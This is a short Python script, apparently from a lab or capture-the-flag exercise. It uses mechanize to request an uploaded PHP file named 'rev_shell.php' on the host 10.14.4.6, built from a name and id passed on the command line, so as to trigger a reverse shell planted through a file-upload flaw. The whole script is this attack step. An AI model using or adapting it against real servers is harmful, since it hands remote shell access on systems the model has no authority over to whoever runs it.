import webbrowser
import sys
import time
import mechanize

#possibly just wait a few seconds first

time.sleep(2)
name = sys.argv[1]
idstr = sys.argv[2]

#webbrowser.open('http://10.14.4.6/upload/'+idstr+'/'+name+'/'+name+'rev_shell.php',new=2)

url = 'http://10.14.4.6/upload/'+idstr+'/'+name+'/'+name+'rev_shell.php'
op = mechanize.Browser()
op.set_handle_robots(False)
op.open(url)
